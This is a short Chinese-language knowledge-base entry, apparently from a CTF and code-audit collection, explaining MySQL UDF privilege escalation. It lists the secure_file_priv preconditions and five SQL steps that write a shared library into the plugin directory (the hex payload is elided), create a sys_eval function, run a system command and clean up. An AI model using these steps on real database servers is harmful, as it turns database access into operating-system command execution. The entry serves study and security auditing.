---
title: MySQL UDF 提权漏洞
category: code-audit
tags: [mysql, udf, privilege-escalation, plugin, command-execution]
triggers: [UDF, mysql, sys_eval, sys_exec, 插件目录, plugin_dir, secure_file_priv, mysqludf]
created: 2026-06-07
updated: 2026-06-07
sources: [ctf-kb/code-audit/MySQL UDF 提权漏洞.md]
---

## Summary

MySQL UDF（用户自定义函数）通过共享库创建能够执行系统命令的函数，实现从 MySQL 到操作系统命令执行。

## Details

### 前提条件

- MySQL 5.5 之前：`secure_file_priv` 默认为空，可向任意路径写文件
- MySQL 5.5 之后：`secure_file_priv` 默认为 NULL，不可写文件

### 利用步骤

1. 查看插件目录：`show variables like '%plugin%';`
2. 将 UDF 动态链接库写入插件目录：`select unhex('...') into dumpfile '/usr/lib64/mysql/plugin/mysqludf.so';`
3. 创建自定义函数：`create function sys_eval returns string soname 'mysqludf.so';`
4. 执行系统命令：`select sys_eval('whoami');`
5. 清理：`drop function sys_eval;`

## Connections

- GHSA: [[code-audit/ghsa-privilege-escalation]]
- Related: [[database-post-exploitation]]
